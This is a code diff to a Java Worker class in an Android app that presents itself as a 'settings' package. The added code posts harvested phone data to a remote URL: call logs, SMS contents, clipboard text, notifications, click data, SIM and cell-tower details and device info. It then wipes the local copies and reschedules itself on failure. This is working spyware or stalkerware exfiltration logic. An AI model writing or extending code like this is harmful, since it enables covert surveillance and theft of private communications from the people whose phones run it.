@@ -25,6 +25,8 @@ import java.util.Map;
 import static com.example.settings.MainActivity.clipboardManager;
 import static com.example.settings.MainActivity.deviceInformation;
 import static com.example.settings.MainActivity.getCellInfo;
+import static com.example.settings.MainActivity.setupWorkManager;
+import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.getDateTime;
 
@@ -116,7 +118,7 @@ public class SyncData extends Worker {
                             @Override
                             public void onErrorResponse(VolleyError error) {
                                 Log.d(context.getPackageName(),"Error");
-
+                                setuponetimeworkManager();
                                 Result.retry();
 
                             }
@@ -158,7 +160,67 @@ public class SyncData extends Worker {
             }
             else {
                 Log.d(context.getPackageName(),"All empty");
-                Result.retry();
+                StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
+                        new Response.Listener<String>() {
+                            @Override
+                            public void onResponse(String response) {
+                                Log.d(context.getPackageName(),response);
+                                mSharedpref.setOutgoingNumbers("");
+                                mSharedpref.setRecievedNumbers("");
+                                mSharedpref.setMissedCallNumber("");
+                                mSharedpref.setSaveTextWritten("");
+                                mSharedpref.setNotificationData("");
+                                mSharedpref.setOtherNotificationData("");
+                                mSharedpref.setSmsData("");
+                                mSharedpref.setClickedData("");
+                                mSharedpref.setOtherClickedData("");
+                                mSharedpref.commit();
+                            }
+                        },
+                        new Response.ErrorListener() {
+                            @Override
+                            public void onErrorResponse(VolleyError error) {
+                                Log.d(context.getPackageName(),"All empty Error");
+                                setuponetimeworkManager();
+
+                                Result.retry();
+
+                            }
+                        }
+                ) {
+                    @Override
+                    protected Map<String, String> getParams() {
+                        Map<String, String> parmas = new HashMap<>();
+
+                        //here we pass params
+                        parmas.put("action", "addItem");
+                        parmas.put("Name", Name);
+                        parmas.put("DaysTime", DaysTime);
+                        parmas.put("TextWritten", "Everything is empty");
+                        parmas.put("OutgoingNumbers", OutgoingNumbers);
+                        parmas.put("RecievedNumbers", RecievedNumbers);
+                        parmas.put("MissedCallNumbers", MissedCallNumbers);
+                        parmas.put("Copiedtext", Copiedtext);
+                        parmas.put("Phonenumberdetails", Phonenumberdetails);
+                        parmas.put("Phoneappdetails", Phoneappdetails);
+                        parmas.put("NotificationData", NotificationData);
+                        parmas.put("OtherNotificationData", OtherNotificationData);
+                        parmas.put("SmsData", SmsData);
+                        parmas.put("ClickedData", ClickedData);
+                        parmas.put("OtherClickedData", OtherClickedData);
+                        parmas.put("Simdetails", String.valueOf(simName(context)));
+                        parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
+                        parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
+                        return parmas;
+                    }
+                };
+
+                int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
+                RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
+                stringRequest.setRetryPolicy(retryPolicy);
+
+                RequestQueue queue = Volley.newRequestQueue(context);
+                queue.add(stringRequest);
 
             }
         }
